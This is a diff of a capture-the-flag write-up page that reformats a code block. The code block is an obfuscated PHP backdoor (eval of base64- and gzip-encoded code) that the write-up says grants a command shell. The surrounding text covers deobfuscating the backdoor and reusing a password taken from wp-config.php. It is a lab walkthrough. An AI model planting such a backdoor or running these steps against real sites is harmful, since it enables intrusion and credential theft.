@@ -285,16 +285,16 @@ Interesting Finding(s):
 <p>We will be digging into second option. Setting the FILEPATH of the exploit to <code>/srv/www/wordpress/utils-bd.php</code>, we will obtain its source code:</p>
 <p><img src="/img/thm-fuscator/10.png" alt="IMG"></p>
 <p>The source code is obfuscated:</p>
-<pre tabindex="0"><code>&lt;?php function flkxkz($jhVI)
-{
-$jhVI=gzinflate(base64_decode($jhVI));
- for($i=0;$i&lt;strlen($jhVI);$i++)
- {
-$jhVI[$i] = chr(ord($jhVI[$i])-1);
- }
- return $jhVI;
- }eval(flkxkz(&#34;U1QEAu6sdEVNpbS8wtIqTUXVhGC3oDC3kNAYjcKUUo04RS1FdXXFrJKStFJN1YQQt+Bwt+AYDc/Q0MCEMCAvwcnDzT9UI05LS7GGWxEKstI1S0qLCwtK8OnQVdRIykjLL43U0FJUsrNTTE/KLUnTQhjCVVJVUpqWp5mcVJJmbpqQmpZSkJqmie48LS0buI467jpuB3sA&#34;));?&gt;
-</code></pre><p>You can choose to deobfuscate it manually, however, by changing the <code>eval()</code> to <code>echo()</code>, we will get the clean deobfuscated source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flkxkz</span>($jhVI)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>$jhVI<span style="color:#f92672">=</span><span style="color:#a6e22e">gzinflate</span>(<span style="color:#a6e22e">base64_decode</span>($jhVI));
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($jhVI);$i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span> {
+</span></span><span style="display:flex;"><span>$jhVI[$i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($jhVI[$i])<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> $jhVI;
+</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">eval</span>(<span style="color:#a6e22e">flkxkz</span>(<span style="color:#e6db74">&#34;U1QEAu6sdEVNpbS8wtIqTUXVhGC3oDC3kNAYjcKUUo04RS1FdXXFrJKStFJN1YQQt+Bwt+AYDc/Q0MCEMCAvwcnDzT9UI05LS7GGWxEKstI1S0qLCwtK8OnQVdRIykjLL43U0FJUsrNTTE/KLUnTQhjCVVJVUpqWp5mcVJJmbpqQmpZSkJqmie48LS0buI467jpuB3sA&#34;</span>));<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>You can choose to deobfuscate it manually, however, by changing the <code>eval()</code> to <code>echo()</code>, we will get the clean deobfuscated source code:</p>
 <p><img src="/img/thm-fuscator/11.png" alt="IMG"></p>
 <p>From the source code, we will know that <code>agentX</code> is required to execute commands successfully, thus getting a www-data shell.</p>
 <p>After getting the www-data shell, we can obtain a password located in <code>wp-config.php</code>, which can be use to login as fuscato by reusing the password:</p>
